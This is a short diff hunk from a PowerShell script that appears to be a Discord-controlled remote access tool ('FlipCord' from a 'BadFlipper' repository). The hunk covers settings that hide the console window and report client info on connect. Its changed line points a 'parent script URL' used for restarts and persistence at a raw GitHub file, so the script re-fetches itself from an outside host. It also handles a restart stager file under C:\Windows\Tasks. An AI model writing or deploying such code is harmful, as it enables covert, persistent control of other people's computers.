@@ -24,7 +24,7 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-$global:parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "https://raw.githubusercontent.com/MrVohi/BadFlipper/refs/heads/main/Remote/FlipCord/main.ps1" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
